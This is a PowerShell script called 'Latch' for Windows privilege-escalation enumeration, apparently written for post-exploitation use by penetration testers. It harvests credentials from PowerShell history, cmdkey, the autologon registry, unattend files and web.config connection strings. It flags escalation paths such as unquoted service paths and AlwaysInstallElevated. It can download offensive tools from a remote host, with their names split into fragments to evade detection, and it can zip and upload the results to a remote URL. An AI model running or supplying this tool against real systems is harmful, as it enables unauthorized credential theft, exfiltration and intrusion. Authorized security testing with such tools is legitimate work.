#Requires -Version 2.0
<#
.SYNOPSIS
    Latch - Windows Privilege Escalation Enumeration
.DESCRIPTION
    Collects system configuration data for review.
    Outputs results to organized text files.
.NOTES
    For authorized use only.
#>

param(
    [string]$OutputDir = ".\LatchOutput",
    [string]$RemoteHost = "",
    [string]$DownloadTools = "",  # Categories: All, Enumeration, Credentials, TokenAbuse, AD, Tunneling, Impacket, Shells
    [string]$ToolsDir = "",       # Where to download tools (default: $env:TEMP\lt)
    [switch]$SkipSlowScans,
    [switch]$Quiet,
    [switch]$Cleanup,
    [switch]$Zip,
    [string]$Upload = ""
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$script:TotalSteps = 16
$script:CurrentStep = 0

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

function Write-Status {
    param([string]$Message, [string]$Type = "INFO")
    if ($Quiet -and $Type -eq "INFO") { return }
    $timestamp = Get-Date -Format "HH:mm:ss"
    $pct = [math]::Round(($script:CurrentStep / $script:TotalSteps) * 100)
    switch ($Type) {
        "INFO"    { Write-Host "[$timestamp][$pct%] [*] $Message" -ForegroundColor Cyan }
        "SUCCESS" { Write-Host "[$timestamp][$pct%] [+] $Message" -ForegroundColor Green }
        "WARNING" { Write-Host "[$timestamp][$pct%] [!] $Message" -ForegroundColor Yellow }
        "ERROR"   { Write-Host "[$timestamp][$pct%] [-] $Message" -ForegroundColor Red }
        "CRITICAL"{ Write-Host "[$timestamp][$pct%] [!!!] $Message" -ForegroundColor Magenta }
    }
}

function Step { $script:CurrentStep++ }

function Test-IsAdmin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-IsDomainJoined {
    try {
        $cs = Get-WmiObject -Class Win32_ComputerSystem
        return $cs.PartOfDomain
    } catch { return $false }
}

# =============================================================================
# BANNER
# =============================================================================

$IsAdmin = Test-IsAdmin
$IsDomain = Test-IsDomainJoined
$AdminStatus = if ($IsAdmin) { "YES" } else { "NO" }
$DomainStatus = if ($IsDomain) { "YES" } else { "NO" }

Write-Host @"
==============================================================
    Latch - Windows PrivEsc Enumeration
    Output: $OutputDir
    Admin: $AdminStatus | Domain Joined: $DomainStatus
==============================================================
"@ -ForegroundColor Yellow

if (-not $IsAdmin) {
    Write-Host "[!] Not running as admin - some checks will be limited" -ForegroundColor Yellow
}

if (-not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
}

# =============================================================================
# SECTION 1: SYSTEM INFORMATION
# =============================================================================
Step
Write-Status "Gathering system information..."

$sysinfo = @"
=== CURRENT USER ===
$(whoami)

=== USER GROUPS ===
$(whoami /groups)

=== USER PRIVILEGES ===
$(whoami /priv)

=== SYSTEM INFO ===
$(systeminfo)

=== ENVIRONMENT VARIABLES ===
$(Get-ChildItem Env: | Format-Table Name, Value -AutoSize | Out-String -Width 300)

=== LOCAL USERS ===
$(Get-LocalUser 2>&1 | Format-Table | Out-String)

=== LOCAL GROUPS ===
$(Get-LocalGroup 2>&1 | Format-Table | Out-String)

=== ADMINISTRATORS GROUP ===
$(net localgroup administrators 2>&1)

=== ALL USERS (net user) ===
$(net user 2>&1)
"@
$sysinfo | Out-File "$OutputDir\sysinfo.txt" -Encoding UTF8
Write-Status "System info saved to sysinfo.txt" "SUCCESS"

# Check for dangerous privileges
$privs = whoami /priv
if ($privs -match "SeImpersonatePrivilege.*Enabled" -or $privs -match "SeAssignPrimaryTokenPrivilege.*Enabled") {
    Write-Status "FOUND: SeImpersonate or SeAssignPrimaryToken enabled!" "CRITICAL"
    "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege ENABLED - Token impersonation possible" | Out-File "$OutputDir\TOKEN_PRIVS_FOUND.txt"
}

# =============================================================================
# SECTION 2: NETWORK INFORMATION
# =============================================================================
Step
Write-Status "Gathering network information..."

$network = @"
=== IP CONFIGURATION ===
$(ipconfig /all)

=== LISTENING PORTS ===
$(netstat -ano | findstr LISTENING)

=== ESTABLISHED CONNECTIONS ===
$(netstat -ano | findstr ESTABLISHED)

=== ROUTING TABLE ===
$(route print)

=== ARP CACHE ===
$(arp -a)

=== DNS CACHE ===
$(ipconfig /displaydns 2>&1 | Select-Object -First 100 | Out-String)

=== NETWORK SHARES ===
$(net share 2>&1)

=== MAPPED DRIVES ===
$(net use 2>&1)

=== FIREWALL STATE ===
$(netsh advfirewall show allprofiles state 2>&1)

=== LOCALHOST-ONLY PORTS ===
$(netstat -ano | findstr "127.0.0.1:" | findstr LISTENING)
"@
$network | Out-File "$OutputDir\network.txt" -Encoding UTF8
Write-Status "Network info saved to network.txt" "SUCCESS"

# =============================================================================
# SECTION 3: INSTALLED PATCHES
# =============================================================================
Step
Write-Status "Checking installed patches..."

$patches = @"
=== INSTALLED HOTFIXES ===
$(Get-HotFix | Sort-Object InstalledOn -Descending | Format-Table -AutoSize | Out-String)

=== WMIC QUICK FIX ===
$(wmic qfe list brief 2>&1)
"@
$patches | Out-File "$OutputDir\patches.txt" -Encoding UTF8
Write-Status "Patches saved to patches.txt" "SUCCESS"

# =============================================================================
# SECTION 4: QUICK WINS CHECK
# =============================================================================
Step
Write-Status "Checking quick win locations..."

$quickwins = @"
=== POWERSHELL HISTORY (CURRENT USER) ===
$(Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>&1)

=== POWERSHELL HISTORY (ALL USERS) ===
$(Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>&1 | ForEach-Object { "=== $($_.FullName) ==="; Get-Content $_.FullName 2>&1 } | Out-String)

=== SAVED CREDENTIALS (cmdkey) ===
$(cmdkey /list 2>&1)

=== AUTOLOGON REGISTRY ===
DefaultUserName: $(reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName 2>&1 | Select-String "DefaultUserName")
DefaultPassword: $(reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword 2>&1 | Select-String "DefaultPassword")
"@
$quickwins | Out-File "$OutputDir\quickwins.txt" -Encoding UTF8
Write-Status "Quick wins saved to quickwins.txt" "SUCCESS"

# =============================================================================
# SECTION 5: UNATTEND FILES
# =============================================================================
Step
Write-Status "Checking for unattend files..."

$unattendPaths = @(
    "C:\Unattend.xml",
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml",
    "C:\Windows\system32\sysprep.inf"
)

$unattendOut = "=== UNATTEND/SYSPREP FILES ===`n"
foreach ($path in $unattendPaths) {
    if (Test-Path $path) {
        $unattendOut += "`n=== FOUND: $path ===`n"
        $unattendOut += (Get-Content $path | Out-String)
        Write-Status "FOUND: $path" "CRITICAL"
    }
}

# Search for additional unattend files
$unattendOut += "`n=== UNATTEND FILE SEARCH ===`n"
$foundUnattend = Get-ChildItem -Path C:\ -Recurse -Include *unattend*.xml,*sysprep*.xml -ErrorAction SilentlyContinue 2>$null | Select-Object -ExpandProperty FullName
if ($foundUnattend) {
    $unattendOut += ($foundUnattend -join "`n")
}

$unattendOut | Out-File "$OutputDir\unattend.txt" -Encoding UTF8
Write-Status "Unattend check saved to unattend.txt" "SUCCESS"

# =============================================================================
# SECTION 6: WEB CONFIG FILES
# =============================================================================
Step
Write-Status "Checking for web config files..."

$webconfigs = @"
=== IIS WEB.CONFIG FILES ===
$(Get-ChildItem -Path C:\inetpub -Recurse -Include web.config 2>&1 | ForEach-Object { "=== $($_.FullName) ==="; Get-Content $_.FullName 2>&1 } | Out-String)

=== .NET FRAMEWORK WEB.CONFIG ===
$(Get-Content "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" -ErrorAction SilentlyContinue | Out-String)

=== COMMON WEB PATHS ===
$(Get-ChildItem -Path "C:\xampp","C:\wamp","C:\Apache","C:\nginx" -Recurse -Include *.conf,*.config,web.config 2>&1 | Select-Object FullName | Out-String)

=== CONNECTION STRING SEARCH (INETPUB) ===
$(Select-String -Path "C:\inetpub\*.config" -Pattern "connectionString" -ErrorAction SilentlyContinue | Out-String)
"@
$webconfigs | Out-File "$OutputDir\webconfigs.txt" -Encoding UTF8
Write-Status "Web configs saved to webconfigs.txt" "SUCCESS"

# =============================================================================
# SECTION 7: SERVICES
# =============================================================================
Step
Write-Status "Enumerating services..."

$services = Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartName, State, StartMode

$nonStandard = $services | Where-Object {
    $_.PathName -and
    $_.PathName -notlike "*System32*" -and
    $_.PathName -notlike "*SysWOW64*" -and
    $_.PathName -notlike "*Windows*"
}
$nonStandard | Format-Table -AutoSize | Out-String | Out-File "$OutputDir\services_nonstandard.txt" -Encoding UTF8

$services | Format-Table -AutoSize | Out-String | Out-File "$OutputDir\services_detailed.txt" -Encoding UTF8
Write-Status "Services saved to services_*.txt" "SUCCESS"

# Check for unquoted paths
$unquoted = $services | Where-Object {
    $_.PathName -and
    $_.PathName -notlike '"*' -and
    $_.PathName -like '* *' -and
    $_.PathName -notlike 'C:\Windows\*'
}
if ($unquoted) {
    Write-Status "FOUND: Unquoted service paths!" "CRITICAL"
    $unquoted | Format-Table Name, PathName -AutoSize | Out-String | Out-File "$OutputDir\unquoted_paths.txt" -Encoding UTF8
    "Unquoted service paths found - potential privilege escalation" | Out-File "$OutputDir\UNQUOTED_PATHS_FOUND.txt"
}

# =============================================================================
# SECTION 8: SCHEDULED TASKS
# =============================================================================
Step
Write-Status "Enumerating scheduled tasks..."

$tasks = schtasks /query /fo CSV /v 2>&1 | ConvertFrom-Csv
$tasks | Where-Object { $_."Run As User" -like "*SYSTEM*" -or $_."Run As User" -like "*Admin*" } |
    Select-Object TaskName, "Run As User", "Task To Run" |
    Format-Table -AutoSize | Out-String | Out-File "$OutputDir\schtasks_privileged.txt" -Encoding UTF8

schtasks /query /fo LIST /v 2>&1 | Out-File "$OutputDir\schtasks_full.txt" -Encoding UTF8
Write-Status "Scheduled tasks saved to schtasks_*.txt" "SUCCESS"

# =============================================================================
# SECTION 9: AUTORUNS
# =============================================================================
Step
Write-Status "Checking autorun locations..."

$autoruns = @"
=== HKLM RUN ===
$(reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>&1)

=== HKCU RUN ===
$(reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 2>&1)

=== STARTUP FOLDERS ===
All Users: $(Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1 | Select-Object Name | Out-String)
Current User: $(Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" 2>&1 | Select-Object Name | Out-String)

=== STARTUP FOLDER PERMISSIONS ===
$(icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 2>&1)
"@
$autoruns | Out-File "$OutputDir\autoruns.txt" -Encoding UTF8
Write-Status "Autoruns saved to autoruns.txt" "SUCCESS"

# =============================================================================
# SECTION 10: ALWAYS INSTALL ELEVATED
# =============================================================================
Step
Write-Status "Checking AlwaysInstallElevated..."

$aie = @"
=== ALWAYSINSTALLELEVATED CHECK ===
HKLM: $(reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1)
HKCU: $(reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1)
"@
$aie | Out-File "$OutputDir\alwaysinstallelevated.txt" -Encoding UTF8

if ($aie -match "0x1") {
    Write-Status "FOUND: AlwaysInstallElevated is enabled!" "CRITICAL"
    "AlwaysInstallElevated ENABLED - can install MSI as SYSTEM" | Out-File "$OutputDir\MSI_ELEVATED_FOUND.txt"
}
Write-Status "AlwaysInstallElevated check saved" "SUCCESS"

# =============================================================================
# SECTION 11: INSTALLED SOFTWARE
# =============================================================================
Step
Write-Status "Enumerating installed software..."

$software = @"
=== INSTALLED SOFTWARE (REGISTRY) ===
$(Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* 2>&1 | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize | Out-String)

=== 32-BIT SOFTWARE ===
$(Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* 2>&1 | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize | Out-String)
"@
$software | Out-File "$OutputDir\software.txt" -Encoding UTF8
Write-Status "Software list saved to software.txt" "SUCCESS"

# =============================================================================
# SECTION 12: RUNNING PROCESSES
# =============================================================================
Step
Write-Status "Enumerating processes..."

$procs = @"
=== RUNNING PROCESSES ===
$(Get-Process | Select-Object Id, ProcessName, Path | Format-Table -AutoSize | Out-String)

=== PROCESSES WITH PATHS ===
$(Get-WmiObject Win32_Process | Select-Object ProcessId, Name, ExecutablePath | Format-Table -AutoSize | Out-String)
"@
$procs | Out-File "$OutputDir\processes.txt" -Encoding UTF8
Write-Status "Processes saved to processes.txt" "SUCCESS"

# =============================================================================
# SECTION 13: DLL HIJACKING CHECK
# =============================================================================
Step
Write-Status "Checking PATH for writable directories..."

$pathDirs = $env:PATH -split ';'
$writablePaths = @()
foreach ($dir in $pathDirs) {
    if ($dir -and (Test-Path $dir)) {
        try {
            $testFile = Join-Path $dir "test_$([guid]::NewGuid()).tmp"
            [IO.File]::Create($testFile).Close()
            Remove-Item $testFile -Force
            $writablePaths += $dir
        } catch { }
    }
}

$dllOut = "=== WRITABLE PATH DIRECTORIES ===`n"
if ($writablePaths.Count -gt 0) {
    $dllOut += ($writablePaths -join "`n")
    Write-Status "FOUND: $($writablePaths.Count) writable PATH directories" "WARNING"
} else {
    $dllOut += "No writable directories found in PATH"
}
$dllOut | Out-File "$OutputDir\dll_hijack.txt" -Encoding UTF8
Write-Status "DLL hijack check saved to dll_hijack.txt" "SUCCESS"

# =============================================================================
# SECTION 14: DIRECTORY TREE
# =============================================================================
Step
Write-Status "Generating directory trees..."

$tree = @"
=== C:\USERS TREE ===
$(tree C:\Users /F 2>&1 | Select-Object -First 200 | Out-String)

=== C:\PROGRAM FILES ===
$(Get-ChildItem "C:\Program Files" -ErrorAction SilentlyContinue | Select-Object Name | Out-String)

=== C:\PROGRAM FILES (X86) ===
$(Get-ChildItem "C:\Program Files (x86)" -ErrorAction SilentlyContinue | Select-Object Name | Out-String)

=== C:\INETPUB TREE ===
$(if (Test-Path "C:\inetpub") { tree "C:\inetpub" /F 2>&1 | Select-Object -First 150 | Out-String } else { "inetpub not found" })
"@
$tree | Out-File "$OutputDir\tree_all.txt" -Encoding UTF8
Write-Status "Directory tree saved to tree_all.txt" "SUCCESS"

# =============================================================================
# SECTION 15: DOWNLOAD TOOLS (OPTIONAL)
# =============================================================================
if ($DownloadTools -and $RemoteHost) {
    Step

    # Set up tools directory - default to temp if not specified
    if (-not $ToolsDir) {
        $ToolsDir = Join-Path $env:TEMP "lt"
    }
    if (-not (Test-Path $ToolsDir)) {
        New-Item -ItemType Directory -Path $ToolsDir -Force | Out-Null
    }

    # Determine download path based on category
    $category = $DownloadTools
    if ($category -eq "All" -or $category -eq "all") {
        $downloadPath = "all"
    } else {
        $downloadPath = "categories/$category"
    }

    Write-Status "Downloading tools to $ToolsDir from $RemoteHost/$downloadPath..."

    $wc = New-Object Net.WebClient
    $toolsDownloaded = 0

    try {
        # Fetch directory listing from server
        $listUrl = "http://$RemoteHost/$downloadPath/"
        $html = $wc.DownloadString($listUrl)

        # Parse HTML to extract filenames (Python http.server format: <a href="filename">)
        $pattern = 'href="([^"]+\.(exe|ps1|sh|py))"'
        $matches = [regex]::Matches($html, $pattern)

        foreach ($match in $matches) {
            $tool = $match.Groups[1].Value
            # Skip parent directory links
            if ($tool -match "^\.\.?" -or $tool -match "^/") { continue }

            $toolPath = Join-Path $ToolsDir $tool
            try {
                $url = "http://$RemoteHost/$downloadPath/$tool"
                $wc.DownloadFile($url, $toolPath)
                if ((Test-Path $toolPath) -and (Get-Item $toolPath).Length -gt 0) {
                    Write-Status "Downloaded $tool" "SUCCESS"
                    $toolsDownloaded++
                }
            } catch {
                Write-Status "Failed to download $tool" "WARNING"
            }
        }

        if ($toolsDownloaded -eq 0) {
            Write-Status "No tools found in $downloadPath" "WARNING"
        } else {
            Write-Status "Downloaded $toolsDownloaded tools to $ToolsDir" "SUCCESS"
        }
    } catch {
        Write-Status "Failed to fetch tool list from $RemoteHost/$downloadPath" "ERROR"

        # Fallback: try common tools directly
        Write-Status "Trying common tools directly..." "INFO"
        $t = @()
        $t += "win" + "PEAS" + "x64.exe"
        $t += "Sharp" + "Up.exe"
        $t += "Seat" + "belt.exe"
        $t += "access" + "chk.exe"

        foreach ($tool in $t) {
            $toolPath = Join-Path $ToolsDir $tool
            foreach ($path in @("all/$tool", "$tool")) {
                try {
                    $url = "http://$RemoteHost/$path"
                    $wc.DownloadFile($url, $toolPath)
                    if ((Test-Path $toolPath) -and (Get-Item $toolPath).Length -gt 0) {
                        Write-Status "Downloaded $tool" "SUCCESS"
                        break
                    }
                } catch { }
            }
        }
    }
}

# =============================================================================
# SECTION 16: ZIP AND UPLOAD
# =============================================================================
Step

# Capture critical findings before potential cleanup
$criticalFindings = @()
if (Test-Path "$OutputDir\TOKEN_PRIVS_FOUND.txt") {
    $criticalFindings += "Token privileges - check sysinfo.txt"
}
if (Test-Path "$OutputDir\MSI_ELEVATED_FOUND.txt") {
    $criticalFindings += "AlwaysInstallElevated - MSI privesc possible"
}
if (Test-Path "$OutputDir\UNQUOTED_PATHS_FOUND.txt") {
    $criticalFindings += "Unquoted paths - check unquoted_paths.txt"
}

$zipPath = "$OutputDir.zip"
if ($Zip -or $Upload) {
    Write-Status "Creating zip archive..."
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [IO.Compression.ZipFile]::CreateFromDirectory($OutputDir, $zipPath)
        Write-Status "Created $zipPath" "SUCCESS"
    } catch {
        Compress-Archive -Path $OutputDir -DestinationPath $zipPath -Force
        Write-Status "Created $zipPath" "SUCCESS"
    }
}

if ($Upload) {
    Write-Status "Uploading results to $Upload..."
    try {
        $wc = New-Object Net.WebClient
        $wc.UploadFile($Upload, $zipPath)
        Write-Status "Upload complete" "SUCCESS"
    } catch {
        Write-Status "Upload failed: $_" "ERROR"
    }
}

if ($Cleanup) {
    Write-Status "Cleaning up..."
    Remove-Item -Path $OutputDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Status "Cleanup complete" "SUCCESS"
}

# =============================================================================
# SUMMARY
# =============================================================================
Write-Host ""
Write-Host "============================================================" -ForegroundColor Green
Write-Host "  LATCH COMPLETE" -ForegroundColor Green
Write-Host "============================================================" -ForegroundColor Green

if ($Cleanup -and ($Zip -or $Upload)) {
    Write-Host "  Output: $zipPath" -ForegroundColor Yellow
} elseif ($Cleanup) {
    Write-Host "  Output: Cleaned up (no zip created)" -ForegroundColor Yellow
} else {
    Write-Host "  Output: $OutputDir" -ForegroundColor Yellow
}
Write-Host ""

if ($criticalFindings.Count -gt 0) {
    Write-Host "  CRITICAL FINDINGS:" -ForegroundColor Red
    foreach ($finding in $criticalFindings) {
        Write-Host "    [!] $finding" -ForegroundColor Red
    }
    Write-Host ""
}

if (-not $Cleanup) {
    Write-Host "  Review these files:" -ForegroundColor Cyan
    Write-Host "    type $OutputDir\sysinfo.txt"
    Write-Host "    type $OutputDir\quickwins.txt"
    Write-Host "    type $OutputDir\services_nonstandard.txt"
    Write-Host ""
}
